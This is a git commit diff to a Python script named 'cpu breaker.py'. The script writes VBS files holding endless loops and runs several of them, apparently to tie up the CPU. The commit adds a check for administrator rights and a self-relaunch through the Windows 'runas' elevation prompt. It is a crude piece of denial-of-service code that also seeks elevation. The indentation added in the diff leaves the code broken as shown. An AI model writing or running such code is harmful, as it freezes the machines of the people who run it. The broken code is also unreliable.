4a29582844d8278512e33c4a008444ac1ec1ad6f
BoldyDeadCoder <62553730+BoldyDeadCoder@users.noreply.github.com>
2024-01-30 21:53:50 -0500

    Update cpu breaker.py

--- cpu breaker.py
+++ cpu breaker.py
@@ -1,6 +1,14 @@
 import os
+import ctypes, sys
 
-def create_and_run_vbs(file_name):
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if is_admin():
+    def create_and_run_vbs(file_name):
     with open(file_name + ".txt", 'w') as f:
         f.writelines("Do\n")
         f.writelines("Loop\n")
@@ -14,3 +22,8 @@ create_and_run_vbs("This_file")
 create_and_run_vbs("HI")
 create_and_run_vbs("keen")
 create_and_run_vbs("f_file")
+
+    print("I have admin privileges!")
+else:
+    # Re-run the program with admin rights
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
